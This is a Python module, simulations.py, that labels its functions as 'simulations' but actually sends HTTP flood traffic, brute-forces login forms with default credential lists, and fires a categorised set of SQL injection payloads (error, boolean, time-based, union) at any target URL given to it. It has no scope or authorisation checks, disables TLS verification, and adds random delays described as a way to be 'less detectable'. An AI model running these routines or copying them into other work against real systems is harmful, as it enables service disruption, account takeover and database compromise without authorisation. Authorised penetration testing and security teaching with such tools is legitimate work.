# simulations.py

import httpx
import asyncio
import time
import random # For random delays in DDoS
from pydantic import BaseModel, HttpUrl, Field
from typing import Optional, List, Dict, Any
from enum import Enum # For HTTP methods

# --- Pydantic Models ---

class HTTPMethod(str, Enum):
    GET = "GET"
    POST = "POST"
    # Add other methods if needed: PUT, DELETE, HEAD, OPTIONS

class DDoSParams(BaseModel):
    target_url: HttpUrl
    num_requests: int = Field(1000, gt=0, le=50000, description="Total number of requests to be sent")
    concurrency: int = Field(50, gt=0, le=500, description="Number of concurrent request workers") # Corrected from "requestors working at the same time"
    method: HTTPMethod = Field(HTTPMethod.GET, description="HTTP method to use")
    payload: Optional[Dict[str, Any]] = Field(None, description="JSON payload for POST requests")
    headers: Optional[Dict[str, str]] = Field(None, description="Custom HTTP headers")
    timeout_seconds: float = Field(10.0, gt=0, description="Timeout for each request (seconds)")
    # Extra: Random delay between requests (to be less detectable)
    random_delay_ms_max: int = Field(0, ge=0, le=1000, description="Maximum random delay between requests (milliseconds, 0 = off)")

class BruteForceParams(BaseModel):
    target_url: HttpUrl
    usernames: List[str] = Field(default_factory=lambda: ["admin", "user", "testuser", "root"])
    passwords: List[str] = Field(default_factory=lambda: ["password", "123456", "admin", "qwerty", "test"])
    # A more flexible way to detect success:
    # Either it will contain text or it will be equal to a specific status code (OR relationship)
    success_text_indicator: Optional[str] = Field(None, description="Text to search for in the response on successful login (case insensitive)")
    success_status_code: Optional[int] = Field(None, description="HTTP status code of successful login (e.g., 200, 302)")
    # Field names in the login form (may vary depending on the target)
    username_field: str = Field("username", description="The name of the username field in the form")
    password_field: str = Field("password", description="Name of the password field in the form")
    concurrency: int = Field(5, gt=0, le=20, description="Number of passwords to try concurrently (for each user)")
    stop_on_first_success: bool = Field(True, description="Stop all attempts on first successful login for any user")

class SQLInjectionParams(BaseModel):
    target_url: HttpUrl
    param_to_inject: str = Field(description="Parameter name where the payload will be injected (URL query or POST form field)")
    method: HTTPMethod = Field(HTTPMethod.GET, description="HTTP method to use")
    # Other form fields for POST requests (excluding the one to be injected with payload)
    other_post_data: Optional[Dict[str, str]] = Field(None, description="Other form data for POST (excluding the parameter to be injected)")
    base_value_for_param: Optional[str] = Field(None, description="Base value of the parameter to be injected (payload can be appended/prepended to it)")
    # More comprehensive payload list
    payload_categories: List[str] = Field(default_factory=lambda: ["error_based", "boolean_based", "time_based_light", "union_light"])
    # To detect success (e.g., SQL error, unexpected content, long response time)
    error_indicator_texts: List[str] = Field(default_factory=lambda: ["sql syntax", "unclosed quotation mark", "odbc driver error", "mysql_fetch_array()", "you have an error in your sql syntax"])
    # Comparing different responses for Boolean-based (more complex, let's stick to text-based for now)
    # time_based_delay_seconds: int = Field(5, description="Expected minimum delay for time-based payloads (seconds)")


# --- SQL Injection Payloads (Categorized) ---
SQLI_PAYLOADS = {
    "error_based": [
        "'", "\"", "`", "\\", "';", "\";", "`sqlmap`",
        "' OR '1'='1", "\"' OR '\"'='\"'",
        " OR 1=1 --", " OR 1=1 #", " OR 1=1/*",
        "AND 1=1", "AND 1=2"
    ],
    "boolean_based": [ # These are usually detected by checking if the response changes
        "' AND '1'='1", "' AND '1'='2",
        "1' AND 1=(SELECT COUNT(*) FROM tablenames); --", # A valid table name is needed instead of tablename
        "' OR 1=CAST(floor(RAND()*100) AS INT) -- " # Search for random numbers in the response
    ],
    "time_based_light": [ # Short delays for test systems
        "' AND SLEEP(1)--", "' OR SLEEP(1)--",
        "1; SELECT PG_SLEEP(1)--", # PostgreSQL
        "1 WAITFOR DELAY '0:0:1'--", # SQL Server
        "benchmark(2000000,MD5(1))" # MySQL (CPU intensive)
    ],
    "union_light": [ # Need to guess the number of columns, this is a simple start
        "' UNION SELECT null--",
        "' UNION SELECT null,null--",
        "' UNION SELECT null,null,null--",
        "' UNION SELECT 1,2,3 --", # If columns are numeric
        "' UNION SELECT 'a','b','c' --", # If columns are text
    ],
    "comment_out": [
        "--", "#", "/*", ";"
    ]
}


# --- DDoS Simulation Function ---
async def run_ddos_simulation(params: DDoSParams) -> Dict[str, Any]:
    print(f"Starting DDoS Simulation: Target={params.target_url}, Requests={params.num_requests}, Concurrency={params.concurrency}") # Corrected from "İstek Sayısı" and "Synchronicity"
    successful_requests = 0
    failed_requests = 0
    status_codes_distribution: Dict[Any, int] = {} # For both numeric codes and "error"
    request_times: List[float] = []
    start_time_total = time.time()

    async def send_single_request(session: httpx.AsyncClient, req_id: int):
        nonlocal successful_requests, failed_requests, status_codes_distribution, request_times
        if params.random_delay_ms_max > 0:
            delay_seconds = random.randint(0, params.random_delay_ms_max) / 1000.0 # asyncio.sleep is in seconds
            await asyncio.sleep(delay_seconds)

        start_req_time = time.time()
        try:
            if params.method == HTTPMethod.POST:
                response = await session.post(
                    str(params.target_url),
                    json=params.payload,
                    headers=params.headers,
                    timeout=params.timeout_seconds
                )
            else:
                response = await session.get(
                    str(params.target_url),
                    headers=params.headers,
                    timeout=params.timeout_seconds
                )
            
            end_req_time = time.time()
            request_times.append(end_req_time - start_req_time)
            status_codes_distribution[response.status_code] = status_codes_distribution.get(response.status_code, 0) + 1
            if 200 <= response.status_code < 400: # We can also count 3xx redirects as successful
                successful_requests += 1
            else:
                failed_requests += 1
        except httpx.TimeoutException:
            failed_requests +=1
            status_codes_distribution["timeout"] = status_codes_distribution.get("timeout", 0) + 1
        except httpx.RequestError as exc: # Corrected from "exc" to not print it directly unless needed for debugging
            failed_requests += 1
            status_codes_distribution["error"] = status_codes_distribution.get("error", 0) + 1
            # print(f"Request {req_id} error: {exc}") # Uncomment for debugging
        except Exception as e: # Corrected from "e" to not print it directly unless needed for debugging
            failed_requests += 1
            status_codes_distribution["unknown_error"] = status_codes_distribution.get("unknown_error", 0) + 1
            # print(f"Request {req_id} unknown error: {e}") # Uncomment for debugging


    # Concurrency control with Semaphore
    semaphore = asyncio.Semaphore(params.concurrency)
    async def worker(session: httpx.AsyncClient, req_id: int):
        async with semaphore:
            await send_single_request(session, req_id)

    async with httpx.AsyncClient(verify=False) as client: # verify=False ignores SSL errors (for testing)
        tasks = [worker(client, i) for i in range(params.num_requests)]
        await asyncio.gather(*tasks, return_exceptions=True) # Continue even if there are errors

    end_time_total = time.time()
    total_duration_seconds = end_time_total - start_time_total
    requests_per_second = params.num_requests / total_duration_seconds if total_duration_seconds > 0 else 0
    avg_request_time_ms = (sum(request_times) / len(request_times) * 1000) if request_times else 0


    result = {
        "target_url": str(params.target_url),
        "method": params.method.value,
        "total_requests_attempted": params.num_requests,
        "successful_requests": successful_requests,
        "failed_requests": failed_requests,
        "status_codes_distribution": status_codes_distribution,
        "total_duration_seconds": round(total_duration_seconds, 3),
        "requests_per_second": round(requests_per_second, 2),
        "average_request_time_ms": round(avg_request_time_ms, 2)
    }
    print(f"DDoS Simulation Completed: {result}")
    return result


# --- Brute Force Simulation Function ---
async def run_bruteforce_simulation(params: BruteForceParams) -> Dict[str, Any]:
    print(f"Starting Brute Force Simulation: Target={params.target_url}")
    credentials_found: List[Dict[str, str]] = []
    total_attempts_made = 0
    simulation_halted = False

    async def try_single_login(session: httpx.AsyncClient, username: str, password: str) -> bool:
        nonlocal total_attempts_made
        total_attempts_made += 1
        login_payload = {params.username_field: username, params.password_field: password}
        try:
            response = await session.post(
                str(params.target_url),
                data=login_payload, # Usually sent as form data
                timeout=15.0,
                follow_redirects=True # Follow redirects after login
            )
            response_text_lower = response.text.lower()

            success = False
            if params.success_status_code and response.status_code == params.success_status_code:
                success = True
            if not success and params.success_text_indicator and params.success_text_indicator.lower() in response_text_lower:
                success = True
            
            # A specific text/status code can also be searched for in failed login attempts
            # For example, "Invalid username or password" or 401 Unauthorized

            if success:
                print(f"Successful Login! User: {username}, Password: {password}") # Corrected from "✅ "
                credentials_found.append({"username": username, "password": password})
                return True
        except httpx.RequestError as exc: # Corrected from "exc" to not print it directly
            # print(f"Error during login attempt ({username}/{password}): {exc}") # Uncomment for debugging
            pass
        return False

    # Concurrency control with Semaphore (separate password attempts for each user)
    semaphore = asyncio.Semaphore(params.concurrency)
    async def worker(session: httpx.AsyncClient, username: str, password: str) -> bool:
        async with semaphore:
            return await try_single_login(session, username, password)

    async with httpx.AsyncClient(verify=False) as client:
        for username in params.usernames:
            if simulation_halted: break
            print(f"Trying passwords for user '{username}'...") # Corrected from "User '{username}' for the ciphers are being tried..."
            password_tasks = [worker(client, username, password) for password in params.passwords]
            
            # Run all tasks with gather, logic to cancel others if one succeeds can be added
            # but let's keep it simple for now, try all passwords (if stop_on_first_success=False)
            results = await asyncio.gather(*password_tasks, return_exceptions=True)
            
            if any(res for res in results if isinstance(res, bool) and res): # If a successful login occurred
                if params.stop_on_first_success:
                    print(f"Password found for '{username}' and stop_on_first_success=True. Simulation is being stopped.")
                    simulation_halted = True
                    break # Break the outer username loop

    result = {
        "target_url": str(params.target_url),
        "total_attempts_made": total_attempts_made,
        "credentials_found": credentials_found,
        "simulation_halted_early": simulation_halted and bool(credentials_found)
    }
    print(f"Brute Force Simulation Completed: {result}")
    return result


# --- SQL Injection Simulation Function ---
async def run_sqlinjection_simulation(params: SQLInjectionParams) -> Dict[str, Any]:
    print(f"Starting SQL Injection Simulation: Target={params.target_url}, Parameter={params.param_to_inject}")
    potentially_vulnerable_findings: List[Dict[str, Any]] = []
    total_payloads_tested = 0
    
    selected_payloads: List[str] = []
    for category in params.payload_categories:
        selected_payloads.extend(SQLI_PAYLOADS.get(category, []))
    
    if not selected_payloads:
        return {
            "message": "No SQLi payload found for the selected categories.",
            "target_url": str(params.target_url),
            "total_payloads_tested": 0,
            "potentially_vulnerable_findings": []
        }

    async with httpx.AsyncClient(verify=False, timeout=20.0) as client: # Timeout can be increased slightly
        for payload_fragment in selected_payloads:
            total_payloads_tested += 1
            # Create the payload (concatenate with base_value)
            full_payload_value = (params.base_value_for_param or "") + payload_fragment
            
            request_params_get: Optional[Dict[str, str]] = None # Not used directly, but for clarity
            request_data_post: Optional[Dict[str, str]] = None
            final_url_str = str(params.target_url)

            if params.method == HTTPMethod.GET:
                # Construct URL properly
                target_url_obj = httpx.URL(params.target_url)
                query_params = dict(target_url_obj.params) # Get existing queries
                query_params[params.param_to_inject] = full_payload_value # Replace target parameter with payload
                final_url_str = str(target_url_obj.copy_with(query=query_params))
            else: # POST
                request_data_post = params.other_post_data.copy() if params.other_post_data else {}
                request_data_post[params.param_to_inject] = full_payload_value

            try:
                start_time = time.time()
                if params.method == HTTPMethod.GET:
                    response = await client.get(final_url_str)
                else: # POST
                    response = await client.post(final_url_str, data=request_data_post)
                end_time = time.time()
                response_time_seconds = end_time - start_time
                
                response_text_lower = response.text.lower()
                vulnerability_detected = False
                detection_reasons = [] # Changed from detection_reason

                for error_indicator in params.error_indicator_texts:
                    if error_indicator.lower() in response_text_lower:
                        vulnerability_detected = True
                        detection_reasons.append(f"Error indicator found: '{error_indicator}'")
                        break # Sufficient once the first error is found

                # Time-based check (very simple version)
                if "time_based" in params.payload_categories: # Only for time_based payloads
                    # In this example, simply, if the payload contains SLEEP(N) and response time is > N
                    # (plus some network latency), it can be considered vulnerable.
                    # A more sophisticated analysis is needed.
                    # For example, parse X if the payload_fragment contains an expression like "SLEEP(X)".
                    # For now, it can be detected with a general timeout or very long-running requests.
                    # This part can be improved based on project details.
                    
                    # Basic attempt to extract sleep duration from payload
                    expected_sleep_duration = 0
                    if "sleep(" in payload_fragment.lower():
                        try:
                            # This is a very naive parser, real-world payloads are more complex
                            sleep_val_str = payload_fragment.lower().split("sleep(")[1].split(")")[0].strip()
                            if sleep_val_str.isdigit():
                                expected_sleep_duration = int(sleep_val_str)
                        except IndexError: # If parsing fails
                            pass
                    
                    # Add a tolerance (e.g., 80% of expected + network overhead)
                    if expected_sleep_duration > 0 and response_time_seconds >= (expected_sleep_duration * 0.8 + 0.5): # 0.5s for base latency
                        vulnerability_detected = True
                        detection_reasons.append(f"Potential time-based detection: Response time {response_time_seconds:.2f}s with payload '{payload_fragment}' (expected ~{expected_sleep_duration}s)")


                if vulnerability_detected:
                    print(f"🎯 Potential SQL Injection Found! Payload: {payload_fragment}, Reasons: {detection_reasons}") # Corrected from "Cause"
                    potentially_vulnerable_findings.append({
                        "payload_used": payload_fragment,
                        "full_value_sent": full_payload_value,
                        "response_status": response.status_code,
                        "response_time_seconds": round(response_time_seconds, 3),
                        "detection_reasons": detection_reasons
                    })

            except httpx.TimeoutException:
                 if "time_based" in params.payload_categories and "sleep" in payload_fragment.lower(): # Check if it was a time-based attempt
                    print(f"⏳ Potential Time-Based SQL Injection (Timeout)! Payload: {payload_fragment}") # Corrected from "Payload {payload_fragment}"
                    potentially_vulnerable_findings.append({
                        "payload_used": payload_fragment,
                        "full_value_sent": full_payload_value,
                        "response_status": "Timeout",
                        "response_time_seconds": client.timeout.read if client.timeout else params.timeout_seconds, # Use client's read timeout
                        "detection_reasons": ["Request timed out, potential time-based SQLi"]
                    })
            except httpx.RequestError as exc: # Corrected from "exc" to not print directly
                # print(f"Error during SQLi attempt ({payload_fragment}): {exc}") # Uncomment for debugging
                pass

    result = {
        "target_url": str(params.target_url),
        "parameter_tested": params.param_to_inject,
        "method_used": params.method.value,
        "total_payloads_tested": total_payloads_tested,
        "potentially_vulnerable_findings": potentially_vulnerable_findings
    }
    print(f"SQL Injection Simulation Completed: {result}")
    return result

# Other simulation functions can be added here if needed, e.g., XSS, Path Traversal, etc.